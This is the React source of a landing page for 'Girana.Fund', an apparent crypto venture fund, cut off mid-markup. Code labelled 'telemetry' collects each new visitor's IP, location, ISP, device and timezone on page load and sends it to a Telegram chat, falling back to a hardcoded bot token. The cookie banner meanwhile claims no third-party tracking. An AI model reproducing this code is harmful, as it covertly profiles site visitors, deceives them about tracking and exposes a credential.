import React, { useEffect, useRef, useState } from 'react';
import gsap from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import { useGSAP } from '@gsap/react';
import Lenis from 'lenis';
import { Menu, X } from 'lucide-react';
import createGlobe from 'cobe';

gsap.registerPlugin(ScrollTrigger);

// Form Telemetry Collector
const gatherTelemetry = async () => {
  let ip = 'Unknown', city = 'Unknown', country = 'Unknown', isp = 'Unknown';
  try {
    const res = await fetch('https://api.db-ip.com/v2/free/self');
    const d = await res.json();
    ip = d.ipAddress || 'Unknown';
    city = d.city || 'Unknown';
    country = d.countryName || 'Unknown';
  } catch(e) {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const d = await res.json();
      ip = d.ip; city = d.city; country = d.country_name; isp = d.org;
    } catch(e2) {}
  }
  return {
    ip: ip || 'Unknown',
    geo: `${city || 'Unknown'}, ${country || 'Unknown'}`,
    isp: isp || 'Unknown',
    ua: navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    url: window.location.href,
    time: new Date().toISOString().replace('T', ' ').substring(0, 19)
  };
};

// Telegram Security Proxy + Fallback
const sendToTelegram = async (baseText: string) => {
  const t = await gatherTelemetry();
  const text = `${baseText}\n\n🔍 <b>System Context</b>\n<b>IP:</b> ${t.ip}\n<b>Geo:</b> ${t.geo}\n<b>ISP:</b> ${t.isp}\n<b>TZ:</b> ${t.tz} | <b>Screen:</b> ${t.screen}\n<b>Time:</b> ${t.time}\n<b>Lang:</b> ${t.lang}\n<b>URL:</b> ${t.url}\n<b>Device:</b> <code>${t.ua}</code>`;
  
  try {
    const url = `/api/telegram`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text }),
    });
    if (!response.ok) throw new Error('Proxy returned non-200');
  } catch (error) {
    console.warn('Backend proxy unreachable, falling back to direct Telegram API');
    const token = '8715802112:AAFcufzTV2r_4JBFl1CDP6MjQ-onCqVE2so';
    const chatId = '-5042990329';
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
    if (!res.ok) throw new Error('Fallback failed');
  }
};

const PORTFOLIO_DATA = [
  { name: 'Espresso', category: 'Infrastructure', url: 'https://www.espressosys.com/', logo: '/api/logo/espressosys.com', image: 'https://images.unsplash.com/photo-1639762681485-074b7f4ec651?auto=format&fit=crop&q=80&w=800' },
  { name: 'Fetch.ai', category: 'Agentic AI', url: 'https://fetch.ai/', logo: '/api/logo/fetch.ai', image: 'https://images.unsplash.com/photo-1677442136019-21780ecad995?auto=format&fit=crop&q=80&w=800' },
  { name: 'Nym', category: 'Data Privacy', url: 'https://nymtech.net/', logo: '/api/logo/nymtech.net', image: 'https://images.unsplash.com/photo-1614064641936-3899897fa46b?auto=format&fit=crop&q=80&w=800' },
  { name: 'Zama', category: 'Cryptography', url: 'https://zama.ai/', logo: '/api/logo/zama.ai', image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=800' },
  { name: 'Helium', category: 'DePIN', url: 'https://www.helium.com/', logo: '/api/logo/helium.com', image: 'https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&q=80&w=800' },
  { name: 'Scroll', category: 'ZK Layer', url: 'https://scroll.io/', logo: '/api/logo/scroll.io', image: 'https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=800' },
  { name: 'LayerZero', category: 'Cross-chain', url: 'https://layerzero.network/', logo: '/api/logo/layerzero.network', image: 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=800' },
  { name: 'Gauntlet', category: 'Tokenomics', url: 'https://gauntlet.network/', logo: '/api/logo/gauntlet.network', image: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&q=80&w=800' }
];

const CATEGORIES = ['All', 'Infrastructure', 'Agentic AI', 'Data Privacy', 'Cryptography', 'DePIN', 'ZK Layer', 'Cross-chain', 'Tokenomics'];

const JOBS_DATA = [
  { id: 1, role: 'Protocol Engineer', company: 'Espresso', location: 'Remote', logo: '/api/logo/espressosys.com' },
  { id: 2, role: 'Applied Cryptographer', company: 'Zama', location: 'Paris / Remote', logo: '/api/logo/zama.ai' },
  { id: 3, role: 'Rust Developer', company: 'Fetch.ai', location: 'Remote', logo: '/api/logo/fetch.ai' },
  { id: 4, role: 'DeFi Economist', company: 'Gauntlet', location: 'New York', logo: '/api/logo/gauntlet.network' },
  { id: 5, role: 'ZK Researcher', company: 'Scroll', location: 'Remote', logo: '/api/logo/scroll.io' }
];

const TESTIMONIALS = [
  {
    text: 'Having Girana.Fund on board meant more than funding \u2014 it meant a network, liquidity, and hands-on protocol support at every stage of growth.',
    name: 'Mikhail Sorokin',
    role: 'Founder, Aether Protocol'
  },
  {
    text: 'They understood our zero-knowledge architecture from the first call. Within a week, we had a signed term sheet and introductions to three tier-1 exchanges.',
    name: 'Lena Vogt',
    role: 'CTO, Nexus Labs'
  },
  {
    text: 'What sets Girana apart is their technical depth. They don\u2019t just write checks \u2014 they review our code, challenge our token models, and push us to build better.',
    name: 'Daniel Kwon',
    role: 'Co-Founder, Orbit Chain'
  }
];

const FAQ_DATA = [
  {
    q: 'What stage companies do you invest in?',
    a: 'We invest from pre-seed through Series A, with check sizes ranging from $250K to $3M. Our sweet spot is teams with a working prototype and a clear technical thesis.'
  },
  {
    q: 'What sectors are you focused on?',
    a: 'Decentralized infrastructure, zero-knowledge cryptography, agentic AI, DePIN, cross-chain interoperability, and privacy-preserving computation.'
  },
  {
    q: 'How long does your investment process take?',
    a: 'On average, 7 days from the first call to a signed agreement. We move fast because we do our technical due diligence in parallel with business evaluation.'
  },
  {
    q: 'Do you lead rounds?',
    a: 'Yes. We\u2019ve led or co-led over 60% of our investments. We also actively co-invest with top-tier funds including a16z crypto, Paradigm, and Polychain.'
  },
  {
    q: 'What support do you provide post-investment?',
    a: 'Technical advisory, tokenomics review, exchange listings, liquidity provision, hiring support, and introductions to our LP and partner network.'
  }
];

function CobeGlobe() {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let phi = 0;

    if (!canvasRef.current) return;

    const globe = createGlobe(canvasRef.current, {
      devicePixelRatio: 2,
      width: 600 * 2,
      height: 600 * 2,
      phi: 0,
      theta: 0,
      dark: 1,
      diffuse: 1.2,
      mapSamples: 16000,
      mapBrightness: 6,
      baseColor: [0.1, 0.1, 0.1],
      markerColor: [1, 1, 1],
      glowColor: [0.2, 0.2, 0.2],
      markers: [
        { location: [40.7128, -74.0060], size: 0.05 }, // NYC
        { location: [51.5074, -0.1278], size: 0.05 }, // London
        { location: [1.3521, 103.8198], size: 0.05 }, // Singapore
        { location: [43.6532, -79.3832], size: 0.05 }, // Toronto
      ],
      onRender: (state) => {
        state.phi = phi;
        phi += 0.003;
      },
    });

    return () => {
      globe.destroy();
    };
  }, []);

  return (
    <div className="globe-canvas-wrapper">
      <canvas
        ref={canvasRef}
        style={{ width: 600, height: 600, maxWidth: "100%", aspectRatio: 1 }}
      />
    </div>
  );
}

function KinematicText({ children, factor = 10 }: { children: React.ReactNode, factor?: number }) {
  const ref = useRef<HTMLDivElement>(null);
  
  useEffect(() => {
    const handleMove = (e: MouseEvent) => {
      if (!ref.current) return;
      const x = (window.innerWidth / 2 - e.clientX) / factor;
      const y = (window.innerHeight / 2 - e.clientY) / factor;
      ref.current.style.transform = `translate(${x}px, ${y}px) scale(1.02)`;
    };
    window.addEventListener('mousemove', handleMove, { passive: true });
    return () => window.removeEventListener('mousemove', handleMove);
  }, [factor]);

  return <div ref={ref} style={{ display: 'inline-block', transition: 'transform 0.2s cubic-bezier(0.2, 0.8, 0.2, 1)' }}>{children}</div>;
}

function ScrambleText({ text, className = '' }: { text: string, className?: string }) {
  const [displayText, setDisplayText] = useState(text);
  const elementRef = useRef<HTMLDivElement>(null);
  const chars = '!<>-_/\\[]{}—=+*^?#_01';

  useEffect(() => {
    const el = elementRef.current;
    if (!el) return;

    let frameRequest: number;
    let frame = 0;
    const queue: { from: string, to: string, start: number, end: number, char?: string }[] = [];
    
    for (let i = 0; i < text.length; i++) {
      const from = chars[Math.floor(Math.random() * chars.length)] || '';
      const start = Math.floor(Math.random() * 40);
      const end = start + Math.floor(Math.random() * 40);
      queue.push({ from, to: text[i], start, end });
    }

    const update = () => {
      let output = '';
      let complete = 0;
      for (let i = 0, n = queue.length; i < n; i++) {
        let { from, to, start, end, char } = queue[i];
        if (frame >= end) {
          complete++;
          output += to;
        } else if (frame >= start) {
          if (!char || Math.random() < 0.28) {
            char = chars[Math.floor(Math.random() * chars.length)];
            queue[i].char = char;
          }
          output += `<span class="scramble-dim">${char}</span>`;
        } else {
          output += from;
        }
      }
      setDisplayText(output);
      
      if (complete === queue.length) {
        cancelAnimationFrame(frameRequest);
      } else {
        frameRequest = requestAnimationFrame(update);
        frame++;
      }
    };

    const observer = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) {
        frameRequest = requestAnimationFrame(update);
        observer.disconnect();
      }
    }, { threshold: 0.1 });

    observer.observe(el);

    return () => {
      cancelAnimationFrame(frameRequest);
      observer.disconnect();
    };
  }, [text]);

  return <span ref={elementRef} className={className} dangerouslySetInnerHTML={{ __html: displayText }} />;
}

function NoiseOverlay() {
  return (
    <div className="noise-overlay" style={{
      backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")`
    }} />
  );
}


function CustomCursor() {
  const cursorRef = useRef<HTMLDivElement>(null);
  const ringRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Only run on non-touch devices
    if ('ontouchstart' in window) return;

    const onMouseMove = (e: MouseEvent) => {
      if (cursorRef.current && ringRef.current) {
        cursorRef.current.style.transform = `translate3d(${e.clientX}px, ${e.clientY}px, 0)`;
        ringRef.current.style.transform = `translate3d(${e.clientX}px, ${e.clientY}px, 0)`;
      }
    };
    
    const onMouseOver = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (target.tagName === 'A' || target.tagName === 'BUTTON' || target.closest('a, button, input, textarea')) {
        ringRef.current?.classList.add('hover');
      } else {
        ringRef.current?.classList.remove('hover');
      }
    };

    const onMouseDown = () => ringRef.current?.classList.add('click');
    const onMouseUp = () => ringRef.current?.classList.remove('click');

    document.addEventListener('mousemove', onMouseMove, { passive: true });
    document.addEventListener('mouseover', onMouseOver, { passive: true });
    document.addEventListener('mousedown', onMouseDown, { passive: true });
    document.addEventListener('mouseup', onMouseUp, { passive: true });

    return () => {
      document.removeEventListener('mousemove', onMouseMove);
      document.removeEventListener('mouseover', onMouseOver);
      document.removeEventListener('mousedown', onMouseDown);
      document.removeEventListener('mouseup', onMouseUp);
    };
  }, []);

  if ('ontouchstart' in window) return null;

  return (
    <>
      <div ref={ringRef} className="cursor-ring"></div>
      <div ref={cursorRef} className="cursor-dot"></div>
    </>
  );
}

function CookieBanner() {
  const [accepted, setAccepted] = useState(true);
  useEffect(() => {
    if (!localStorage.getItem('girana_cookies')) setAccepted(false);
  }, []);

  if (accepted) return null;
  return (
    <div className="cookie-banner">
      <p>We use localized telemetry to optimize sovereign execution context. No third-party tracking.</p>
      <button onClick={() => { localStorage.setItem('girana_cookies', 'true'); setAccepted(true); }}>ACCEPT [Y]</button>
    </div>
  );
}

function Preloader({ onFinish }: { onFinish: () => void }) {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(onFinish, 400);
          return 100;
        }
        return prev + Math.random() * 15 + 5;
      });
    }, 80);
    return () => clearInterval(interval);
  }, [onFinish]);

  return (
    <div className={`preloader ${progress >= 100 ? 'preloader--done' : ''}`}>
      <div className="preloader-content">
        <div className="preloader-logo">GIRANA<span>.FUND</span></div>
        <div className="preloader-bar">
          <div className="preloader-fill" style={{ width: `${Math.min(progress, 100)}%` }}></div>
        </div>
        <div className="preloader-percent">{Math.min(Math.round(progress), 100)}%</div>
      </div>
    </div>
  );
}

function ScrollToTop() {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const onScroll = () => setVisible(window.scrollY > 600);
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  const scrollUp = () => window.scrollTo({ top: 0, behavior: 'smooth' });

  return (
    <button
      className={`scroll-top-btn ${visible ? 'visible' : ''}`}
      onClick={scrollUp}
      aria-label="Scroll to top"
    >
      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="2">
        <path d="M10 16V4M4 10l6-6 6 6" />
      </svg>
    </button>
  );
}

export default function App() {
  const containerRef = useRef<HTMLDivElement>(null);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [activeTab, setActiveTab] = useState('All');
  const [selectedJob, setSelectedJob] = useState<any>(null);
  const [scrolled, setScrolled] = useState(false);
  const [loading, setLoading] = useState(true);
  const [activeSection, setActiveSection] = useState('');
  const [testimonialIdx, setTestimonialIdx] = useState(0);
  const [openFaq, setOpenFaq] = useState<number | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  const filteredPortfolio = activeTab === 'All' 
    ? PORTFOLIO_DATA 
    : PORTFOLIO_DATA.filter(item => item.category === activeTab);

  // Auto-rotate testimonials
  useEffect(() => {
    const timer = setInterval(() => {
      setTestimonialIdx(prev => (prev + 1) % TESTIMONIALS.length);
    }, 6000);
    return () => clearInterval(timer);
  }, []);

  // Active nav section tracking
  useEffect(() => {
    const sections = document.querySelectorAll('section[id]');
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          setActiveSection(entry.target.id);
        }
      });
    }, { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' });
    sections.forEach(s => observer.observe(s));
    return () => observer.disconnect();
  }, [loading]);

  // Cursor glow
  useEffect(() => {
    const glow = document.createElement('div');
    glow.className = 'cursor-glow';
    document.body.appendChild(glow);
    const move = (e: MouseEvent) => {
      glow.style.left = e.clientX + 'px';
      glow.style.top = e.clientY + 'px';
    };
    window.addEventListener('mousemove', move, { passive: true });
    return () => {
      window.removeEventListener('mousemove', move);
      glow.remove();
    };
  }, []);

  useEffect(() => {
    const notifyVisit = async () => {
      if (sessionStorage.getItem('girana_visit_notified')) return;
      sessionStorage.setItem('girana_visit_notified', 'true');
      try {
        await sendToTelegram(`👁 <b>New Visitor to Girana.Fund</b>`);
      } catch (e) {}
    };
    notifyVisit();
  }, []);

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 50);
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  useEffect(() => {
    const lenis = new Lenis();

    lenis.on('scroll', ScrollTrigger.update);

    gsap.ticker.add((time) => {
      lenis.raf(time * 1000);
    });

    gsap.ticker.lagSmoothing(0);

    return () => {
      lenis.destroy();
      gsap.ticker.remove(lenis.raf);
    };
  }, []);

  useGSAP(() => {
    // HERO ENTRANCE
    gsap.from(".animate-text", {
      y: 60,
      opacity: 0,
      duration: 1.2,
      stagger: 0.2,
      ease: "power4.out"
    });

    // SCROLL REVEAL
    gsap.utils.toArray(".animate-up").forEach((el: any) => {
      gsap.from(el, {
        scrollTrigger: {
          trigger: el,
          start: "top 95%",
        },
        y: 40,
        opacity: 0,
        duration: 1,
        ease: "power2.out"
      });
    });

    // BORDER LINES
    gsap.utils.toArray(".border-top").forEach((line: any) => {
      gsap.from(line, {
        scrollTrigger: {
          trigger: line,
          start: "top 98%",
        },
        scaleX: 0,
        transformOrigin: "left",
        duration: 1.8,
        ease: "expo.out"
      });
    });

    // PROCESS LINE SCRUB
    gsap.from(".process-line", {
      scrollTrigger: {
        trigger: ".process-container",
        start: "top 70%",
        end: "bottom 80%",
        scrub: true
      },
      scaleY: 0,
      ease: "none"
    });

    // STAT COUNTERS
    document.querySelectorAll(".stat-num").forEach((el: any) => {
      const target = parseInt(el.dataset.target, 10);
      
      gsap.fromTo(el, { innerText: 0 }, {
        innerText: target,
        duration: 2.5,
        ease: "power2.out",
        snap: { innerText: 1 },
        scrollTrigger: {
          trigger: el,
          start: "top 90%",
          once: true
        }
      });
    });

    // Grid Reveal
    gsap.to('.grid-overlay', {
      opacity: 0, delay: 0.5, duration: 1, ease: 'power2.inOut',
    });

    // Horizontal Scroll for Investment Thesis
    if (window.innerWidth > 1024) {
      const thesisContainer = document.querySelector('#thesis');
      const thesisGrid = document.querySelector('.thesis-grid') as HTMLElement;
      
      if (thesisContainer && thesisGrid) {
        gsap.to(thesisGrid, {
          x: () => -(thesisGrid.scrollWidth - thesisContainer.clientWidth),
          ease: 'none',
          scrollTrigger: {
            trigger: thesisContainer,
            pin: true,
            scrub: 1,
            end: () => "+=" + thesisGrid.scrollWidth,
            invalidateOnRefresh: true
          }
        });
      }
    }

    ScrollTrigger.refresh();
  }, { scope: containerRef });

  const toggleMenu = () => setIsMenuOpen(!isMenuOpen);

  return (
    <>
    <CustomCursor />
    <CookieBanner />
    <NoiseOverlay />
    {loading && <Preloader onFinish={() => setLoading(false)} />}
    <div ref={containerRef} className={loading ? 'site-hidden' : 'site-visible'}>
      <div className="grid-overlay"></div>

      <nav className={`nav-bar ${scrolled ? 'nav-scrolled' : ''}`}>
        <div className="container nav-content">
          <div className="logo">
            <a href="#" onClick={(e) => { e.preventDefault(); window.scrollTo({ top: 0, behavior: 'smooth' }); }}>GIRANA.FUND</a>
          </div>
          <button className="mobile-toggle" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
            {mobileMenuOpen ? 'CLOSE [X]' : 'MENU [=]'}
          </button>
          <div className="nav-links desktop-links">
            <a href="#portfolio" className={activeSection === 'portfolio' ? 'nav-active' : ''}>Portfolio</a>
            <a href="#founders" className={activeSection === 'founders' ? 'nav-active' : ''}>Founders</a>
            <a href="#process" className={activeSection === 'process' ? 'nav-active' : ''}>How it works</a>
            <a href="#news" className={activeSection === 'news' ? 'nav-active' : ''}>Insights</a>
            <a href="#jobs" className={activeSection === 'jobs' ? 'nav-active' : ''}>Careers</a>
            <a href="#lp" className={activeSection === 'lp' ? 'nav-active' : ''}>LP Access</a>
            <a href="#pitch" className="nav-cta">Pitch Us &rarr;</a>
          </div>
        </div>
      </nav>

      {/* Mobile Menu Overlay */}
      <div className={`mobile-menu-overlay ${mobileMenuOpen ? 'open' : ''}`}>
        <div className="mobile-links">
          <a href="#portfolio" onClick={() => setMobileMenuOpen(false)}>PORTFOLIO</a>
          <a href="#founders" onClick={() => setMobileMenuOpen(false)}>FOUNDERS</a>
          <a href="#process" onClick={() => setMobileMenuOpen(false)}>HOW IT WORKS</a>
          <a href="#thesis" onClick={() => setMobileMenuOpen(false)}>THESIS</a>
          <a href="#jobs" onClick={() => setMobileMenuOpen(false)}>CAREERS</a>
          <a href="#lp" onClick={() => setMobileMenuOpen(false)} className="pitch-link">PITCH US →</a>
        </div>
      </div>

      <main>
        <section className="hero container">
          <div className="hero-content">
            <span className="label animate-text">/ 01. PREFACE</span>
            <KinematicText factor={30}>
              <h1 className="animate-text"><ScrambleText text="QUANTUM" /><br /><ScrambleText text="LEAP." /></h1>
            </KinematicText>
            <div className="hero-footer border-top">
              <p className="animate-up">We invest in the architecture of the future: decentralized protocols, autonomous AI agents, and sovereign computing.</p>
              <div className="stat animate-up">V.01<span>2026</span></div>
            </div>
          </div>
        </section>

        <div className="ticker-wrap border-top">
          <div className="ticker-track">
            <span>DECENTRALIZED PROTOCOLS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>AGENTIC AI</span>
            <span className="ticker-dot">&#9670;</span>
            <span>SOVEREIGN COMPUTE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>WEB3 INFRASTRUCTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CRYPTOGRAPHIC PRIVACY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>TOKEN ARCHITECTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>ZERO-KNOWLEDGE PROOFS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CROSS-CHAIN LIQUIDITY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>DECENTRALIZED PROTOCOLS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>AGENTIC AI</span>
            <span className="ticker-dot">&#9670;</span>
            <span>SOVEREIGN COMPUTE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>WEB3 INFRASTRUCTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CRYPTOGRAPHIC PRIVACY</span>
            <span className="ticker-dot">&#9670;</span>
            <span>TOKEN ARCHITECTURE</span>
            <span className="ticker-dot">&#9670;</span>
            <span>ZERO-KNOWLEDGE PROOFS</span>
            <span className="ticker-dot">&#9670;</span>
            <span>CROSS-CHAIN LIQUIDITY</span>
            <span className="ticker-dot">&#9670;</span>
          </div>
        </div>

        <section id="portfolio" className="section border-top">
          <div className="container">
            <span className="label"><ScrambleText text="/ 02. PORTFOLIO" /></span>
            
            <div className="portfolio-tabs animate-up">
              {CATEGORIES.map(cat => (
                <button 
                  key={cat} 
                  className={`tab-btn ${activeTab === cat ? 'active' : ''}`}
                  onClick={() => setActiveTab(cat)}
                >
                  {cat}
                </button>
              ))}
            </div>

            <div className="portfolio-grid">
              {filteredPortfolio.map((item, i) => (
                <a 
                  key={item.name} 
                  href={item.url} 
                  target="_blank" 
                  rel="noreferrer" 
                  className="p-item animate-up" 
                  style={{ animationDelay: `${i * 0.1}s` }}
                >
                  <div className="p-image-bg" style={{ backgroundImage: `url(${item.image})` }}></div>
                  <div className="p-content">
                    <div className="p-header">
                      <img src={item.logo} alt={`${item.name} logo`} className="p-logo" loading="lazy" onError={(e) => {
                        const el = e.target as HTMLImageElement;
                        el.style.display = 'none';
                        const fallback = document.createElement('div');
                        fallback.className = 'p-logo-fallback';
                        fallback.textContent = item.name.charAt(0);
                        el.parentElement?.appendChild(fallback);
                      }} />
                      <span className="p-arrow">&nearr;</span>
                    </div>
                    <div>
                      <span>{item.name}</span>
                      <br />
                      <small>{item.category}</small>
                    </div>
                  </div>
                </a>
              ))}
            </div>
          </div>
        </section>

        <section className="section-stats border-top">
          <div className="container">
            <div className="stats-grid">
              <div className="stat-block">
                <div className="stat-num" data-target="50">0</div>
                <div className="stat-label">Portfolio companies<br />backed across Web3</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="12">0</div>
                <div className="stat-label">Countries with<br />active investments</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="3">0</div>
                <div className="stat-label">Fund generations<br />deployed</div>
              </div>
              <div className="stat-block">
                <div className="stat-num" data-target="7">0</div>
                <div className="stat-label">Days avg. from call<br />to signed agreement</div>
              </div>
            </div>
          </div>
        </section>

        <section id="founders" className="section border-top">
          <div className="container">
            <span className="label">/ 03. FOUNDERS</span>
            <div className="team-grid">
              <div className="team-card animate-up">
                <div className="img-box">
                  <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=800" alt="Han Min-ji" loading="lazy" />
                </div>
                <div className="team-info">
                  <h3>Han Min-ji</h3>
                  <p>Managing Partner</p>
                  <div className="team-social">
                    <a href="https://t.me/MinJiShadee" target="_blank" rel="noreferrer">TELEGRAM</a>
                  </div>
                </div>
              </div>
              <div className="team-card animate-up">
                <div className="img-box">
                  <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&q=80&w=800" alt="Arun Devabhaktuni" loading="lazy" />
                </div>
                <div className="team-info">
                  <h3>Arun Devabhaktuni</h3>
                  <p>General Partner</p>
                  <div className="team-social">
                    <a href="https://t.me/fman_ventures" target="_blank" rel="noreferrer">TELEGRAM</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section className="section-quote border-top">
          <div className="container">
            <div className="quote-inner animate-up">
              <div className="quote-mark">&ldquo;</div>
              <blockquote key={testimonialIdx} className="quote-fade">{TESTIMONIALS[testimonialIdx].text}</blockquote>
              <div className="quote-author">
                <div className="quote-line"></div>
                <div>
                  <p className="quote-name">{TESTIMONIALS[testimonialIdx].name}</p>
                  <p className="quote-role">{TESTIMONIALS[testimonialIdx].role}</p>
                </div>
              </div>
              <div className="quote-dots">
                {TESTIMONIALS.map((_, i) => (
                  <button
                    key={i}
                    className={`quote-dot ${i === testimonialIdx ? 'active' : ''}`}
                    onClick={() => setTestimonialIdx(i)}
                    aria-label={`Testimonial ${i + 1}`}
                  />
                ))}
              </div>
            </div>
          </div>
        </section>

        <section id="thesis" className="section border-top">
          <div className="container">
            <span className="label"><ScrambleText text="/ 04. INVESTMENT THESIS" /></span>
            <div className="thesis-grid">
              <div className="thesis-card animate-up">
                <div className="thesis-icon">◈</div>
                <h3>Decentralized Infrastructure</h3>
                <p>We back the core protocols that will replace centralized middleware — consensus layers, execution environments, and data availability solutions.</p>
              </div>
              <div className="thesis-card animate-up">
                <div className="thesis-icon">◇</div>
                <h3>Autonomous AI Agents</h3>
                <p>AI that operates on-chain, owns assets, and executes complex strategies. We invest in the intersection of artificial intelligence and programmable money.</p>
              </div>
              <div className="thesis-card animate-up">
                <div className="thesis-icon">△</div>
                <h3>Privacy & Cryptography</h3>
                <p>Zero-knowledge proofs, fully homomorphic encryption, and secure multi-party computation. Privacy is not optional — it is the foundation of sovereign computing.</p>
              </div>
              <div className="thesis-card animate-up">
                <div className="thesis-icon">⬡</div>
                <h3>Token Economies</h3>
                <p>Sound token design, mechanism engineering, and game-theoretic incentive structures that align participants and create sustainable network value.</p>
              </div>
            </div>
          </div>
        </section>

        <section id="process" className="section border-top">
          <div className="container">
            <span className="label">/ 05. OPERATING MODEL</span>
            <div className="process-container">
              <div className="process-line"></div>
              
              <div className="step animate-up">
                <div className="step-num">01</div>
                <div className="step-txt">
                  <h3>Sourcing &amp; Discovery</h3>
                  <p>Our analytical department works directly with open-source repositories and technical communities. We look for fundamental engineering solutions that solve scalability and privacy challenges in the Web3 stack, rather than just business plans.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">02</div>
                <div className="step-txt">
                  <h3>Technical Resilience</h3>
                  <p>Every project undergoes a multi-level audit. We verify smart contract resilience, token economic models, and ecosystem integration potential. We only invest in what we understand at the code level.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">03</div>
                <div className="step-txt">
                  <h3>Capital Deployed</h3>
                  <p>Post-investment, we become a technical and legal partner. Girana.Fund provides access to liquidity, assists with mainnet launch architecture, and ensures direct contact with major exchanges and institutional players.</p>
                </div>
              </div>

              <div className="step animate-up">
                <div className="step-num">04</div>
                <div className="step-txt">
                  <h3>Strategic Growth</h3>
                  <p>Most of our companies attract follow-on rounds from top-tier funds. We help founders prepare for fundraising, connect them with co-investors, and scale their runway. Speed without compromising quality is our standard.</p>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section className="section-global border-top">
          <div className="container">
            <div className="global-inner">
              <div className="global-text animate-up">
                <span className="label"><ScrambleText text="/ 06. WORLDWIDE PRESENCE" /></span>
                <KinematicText factor={40}>
                  <h2 className="global-headline"><ScrambleText text="Velocity" /><br /><ScrambleText text="that counts." /></h2>
                </KinematicText>
                <p>We invest globally &mdash; from North America and Europe to Asia and emerging markets. This reach gives our founders early access to international partners, exchanges, and local ecosystems from day one.</p>
                <div className="global-regions">
                  <div className="region animate-up">
                    <span className="region-name">North America</span>
                    <span className="region-desc">New York &middot; San Francisco &middot; Toronto</span>
                  </div>
                  <div className="region animate-up">
                    <span className="region-name">Europe</span>
                    <span className="region-desc">London &middot; Zurich &middot; Dubai</span>
                  </div>
                  <div className="region animate-up">
                    <span className="region-name">Asia Pacific</span>
                    <span className="region-desc">Singapore &middot; Hong Kong &middot; Tokyo</span>
                  </div>
                </div>
              </div>
              <div className="global-visual animate-up">
                <CobeGlobe />
              </div>
            </div>
          </div>
        </section>

        <section id="news" className="section-news border-top">
          <div className="container">
            <span className="label">/ 07. INSIGHTS &amp; RESEARCH</span>
            <div className="news-grid">
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Research</span>
                    <span>Oct 12, 2026</span>
                  </div>
                  <h3 className="news-title">The Sovereign Compute Thesis: Why AI Needs Decentralization</h3>
                </div>
                <div className="news-link">Read Paper &rarr;</div>
              </a>
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Announcement</span>
                    <span>Sep 28, 2026</span>
                  </div>
                  <h3 className="news-title">Girana.Fund leads $15M Series A in Neural Protocol</h3>
                </div>
                <div className="news-link">Read Press Release &rarr;</div>
              </a>
              <a href="#" className="news-card animate-up">
                <div>
                  <div className="news-meta">
                    <span>Market Update</span>
                    <span>Aug 04, 2026</span>
                  </div>
                  <h3 className="news-title">Zero-Knowledge Proofs: The New Standard for Institutional Privacy</h3>
                </div>
                <div className="news-link">Read Article &rarr;</div>
              </a>
            </div>
          </div>
        </section>

        <section id="jobs" className="section-jobs border-top">
          <div className="container">
            <span className="label">/ 08. PORTFOLIO CAREERS</span>
            <div className="job-list animate-up">
              {JOBS_DATA.map(job => (
                <button key={job.id} onClick={() => setSelectedJob(job)} className="job-item">
